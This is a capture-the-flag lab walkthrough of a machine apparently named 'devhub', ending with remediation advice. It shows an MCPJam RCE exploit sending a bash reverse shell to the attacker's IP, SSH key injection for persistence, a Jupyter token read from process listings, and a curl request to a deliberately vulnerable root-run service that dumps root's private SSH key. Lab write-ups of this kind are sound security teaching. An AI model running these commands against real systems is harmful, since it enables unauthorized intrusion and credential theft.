
![Logo](Images/Logo.png)

# Attack Chain

```
└─► nmap → SSH (22) + nginx (80) + MCPJam Inspector (6274)
    └─► CVE-2026-23744 (MCPJam ≤1.4.2 — unauthenticated RCE)
        └─► Reverse shell as mcp-dev
            └─► netstat → internal ports 5000 (OPSMCP) + 8888 (Jupyter)
                └─► SSH key injection into mcp-dev → port forward 5000 + 8888
                    └─► ps aux → Jupyter token leaked in command line
                        └─► JupyterLab auth → code execution as analyst → user.txt
                            └─► Readable /opt/opsmcp/server.py (running as root)
                                └─► Hidden-but-routable tool ops._admin_dump
                                    └─► Dump root's SSH private key
                                        └─► SSH root:id_rsa → Shell as root
```

# Sommaire

- [Enumeration](#enumeration)
- [Website - Port 80](#website---port-80)
- [MCPJam](#mcpjam)
	- [CVE-2026-23744](#cve-2026-23744)
	- [Reverse Shell as mcp-dev](#reverse-shell-as-mcp-dev)
- [Lateral Movement](#lateral-movement)
	- [Port Forwarding](#port-forwarding)
	- [OPSMCP - Port 5000](#opsmcp---port-5000)
	- [Jupyter - Port 8888](#jupyter---port-8888)
- [Privilege Escalation](#privilege-escalation)
	- [server.py](#serverpy)
	- [Shell as root](#shell-as-root)

---
# Enumeration

```
nmap -sVC -p- 10.129.8.72 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2026-06-02 10:32 CEST
Nmap scan report for devhub.htb (10.129.8.72)
Host is up (0.030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35782e790d8713052f538ee73c55b64c (ECDSA)
|_  256 dd568ebcdab8383e9acd0b74ee5385f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevHub - Internal Development Platform
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Tue, 02 Jun 2026 08:34:41 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Tue, 02 Jun 2026 08:34:41 GMT
|_    Connection: close
```

Only 3 ports open on the target. There is a redirect to `devhub.htb` on port 80 so let's add the entry to our `/etc/hosts` file so we can resolve it.

# Website - Port 80

Let's head to the main website on port 80

![Website - Port 80](Images/Website%20-%20Port%2080.png)

We can't do much here, but we have some precious information about the target :

- An MCP Inspector is running on port 6274 which is active and accessible by us.
- There is an Analytics Dashboard running on port 8888 on the target but internaly so we can't access it for now.

# MCPJam

Let's move on to MCP Inspector on port 6274 to see what we can find.

![MCPJam](Images/MCPJam.png)

### CVE-2026-23744

We are landing on **MCPJam**, the software suffered some critical CVE recently so let's check the version by clicking on **Settings**.

![MCPJam version](Images/MCPJam%20version.png)

The running version is **1.4.2** and is vulnerable to **CVE-2026-23744** which leads to Remote Code Execution by crafting a malicious HTTP request on the target.

### Reverse Shell as mcp-dev

We can use this [poc](https://github.com/boroeurnprach/CVE-2026-23744-PoC) to get a reverse shell.

```
python3 exploit.py 10.129.8.72 'bash -c "bash -i >& /dev/tcp/10.10.*.*/443 0>&1"'
[*] Waiting for server to start on port 6274...
[+] Server is up and running.
[*] Sending exploit payload...
[*] Request failed (this might be expected if the command execution interrupts the connection): HTTPConnectionPool(host='10.129.*.*', port=6274): Read timed out. (read timeout=5)
[+] Payload sent.
```

We should get a connection back on our listener right after.

```
penelope -i tun0 -p 443
[+] Listening for reverse shells on 10.10.16.87:443
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from devhub~10.129.8.72-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /root/.penelope/sessions/devhub~10.129.8.72-Linux-x86_64/2026_06_02-10_59_47-585.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

# Lateral Movement

We got our foothold on the target. Let's find a way to pivot to another user.

```
mcp-dev@devhub:/opt$ ls /home
analyst  mcp-dev
```

The only other user is `analyst` and we can't access its folder.

Let's look for open ports on the target since we know that something should run internaly.

```
netstat -tlnup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:6274            0.0.0.0:*               LISTEN      1279/node
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

We can see 2 additional ports on the target that we couldn't access from outside, 5000 and 8888.

### Port Forwarding

To forward the ports on my machine, I chose to inject my ssh public key inside the `.ssh` folder of `mcp-dev`.

First we create our key.

```
ssh-keygen -t rsa -b 4096 -f mcp-dev
```

Then we need to inject the key by creating the `.ssh` folder, writing our key inside the `authorized_keys` file, and give it appropriate rights.

```
mcp-dev@devhub:~$ mkdir .ssh
mcp-dev@devhub:~$ cd .ssh
mcp-dev@devhub:/home/mcp-dev/.ssh$ echo '<public_key>' > authorized_keys
mcp-dev@devhub:/home/mcp-dev/.ssh$ chmod 600 authorized_keys
```

Now we should be able to connect over SSH as `mcp-dev`.

```
ssh -i mcp-dev mcp-dev@devhub.htb

mcp-dev@devhub:~$ 
```

It worked as planned, let's forward the ports on our machine.

```
ssh -i mcp-dev -L 5000:127.0.0.1:5000 -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb
```


### OPSMCP - Port 5000

![Port 5000](Images/Port%205000.png)

We are landing on a page that host tools but we need an API key in order to use them which we do not have. So let's keep this for later.

### Jupyter - Port 8888


![Jupyter auth](Images/Jupyter%20auth.png)

There is a login panel to access ressources hosted on a **jupyter** server. We do not have creds nor token. Let's get back to our shell as `mcp-dev` to see what we can find and to know which user is running jupyter.

```
ps aux | grep jupyter
analyst     1062  0.1  2.4 183080 97664 ?        Ss   08:26   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1069  0.0  0.7 185864 28808 ?        Ss   08:26   0:01 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
mcp-dev     2122  0.0  0.0   6612  2288 pts/1    S+   09:33   0:00 grep --color=auto jupyter
```

We got valuable information. The server runs as `analyst` and we know the token used for authentication as well since the server has been started with that parameters. 

Let's try to connect now.

![Auth Successful](Images/Auth%20Successful.png)

It worked, and we see that we can access a terminal from here.

![Terminal as analyst](Images/Terminal%20as%20analyst.png)

We can run commands as `analyst`, and we can get the user flag from here.

# Privilege Escalation

There was a folder we couldn't access before at `/opt/opsmcp`, and we know that `server.py` is running as root inside from the output of `ps aux` regarding jupyter.

### server.py

Let's cat the file.

```
analyst@devhub:/opt/opsmcp$ cat server.py 

#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

Let's break down the script to understand why it's exploitable.

We retrieve three useful things : 

- The hardcoded API key (`opsmcp_secret_key_4f5a6b7c8d9e0f1a`)
- The existence of two **hidden tools** (`ops._admin_dump` and `ops._debug_mode`)
-  `_admin_dump` can read `root`'s private SSH key

The interesting part is the routing logic. The hidden tools are deliberately kept out of `/tools/list`, which only enumerates `VISIBLE_TOOLS`. 

However, the `/tools/call` handler validates the requested tool against `ALL_TOOLS` (`VISIBLE_TOOLS` **and** `HIDDEN_TOOLS` merged), not against `VISIBLE_TOOLS`:


```python
ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}
...
if tool_name not in ALL_TOOLS:
    return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
```

So even though `_admin_dump` is invisible, it remains fully callable as long as we know its name.

The only barrier in front of it is the static API key, which we now have. There is no privilege check, no allow-list of exposed tools, nothing tying tool access to the caller's identity.

The second half of the chain is the process owner. From the earlier `ps aux` output we know `server.py` runs as **root**. When we hit `_admin_dump` with `target=ssh_keys`, the `open('/root/.ssh/id_rsa')` call executes in that root context and succeeds, whereas the same read would be flatly denied to us as `analyst`.

These two facts combined are what make the box: a hidden-but-routed administrative tool, exposed by a process running as root. Either alone would be harmless, together they hand us root's private key over an unauthenticated-by-design internal API.

With this information, we can craft the `curl` command to retrieve `root`'s SSH private key.

```
curl -s -X POST http://127.0.0.1:5000/tools/call -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -H 'Content-Type: application/json' -d '{"name":"ops._admin_dump", "arguments":{"target":"ssh_keys","confirm":true}}' | jq -r '.root_private_key'

-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

### Shell as root

Now we write the key to a file, give it appropriate permissions.

```
echo '<root_key>' > root_rsa
chmod 600 root_rsa
```

And we can connect over SSH as `root`.

```
ssh -i root_rsa root@devhub.htb

root@devhub:~#
```

Machine rooted

# Remediation

- **MCPJam Inspector** — upgrade to ≥1.4.3 and bind the service to 127.0.0.1 instead of 0.0.0.0 to prevent unauthenticated RCE (CVE-2026-23744).
- **Jupyter** — never pass the auth token as a command-line argument; it is readable by any local user via `ps`. Use a config file or environment variable instead.
- **OPSMCP** — do not run a credential-dumping service as root behind a single static API key. Remove the hidden tools, enforce real authentication, and apply least privilege so the process cannot read `/root`.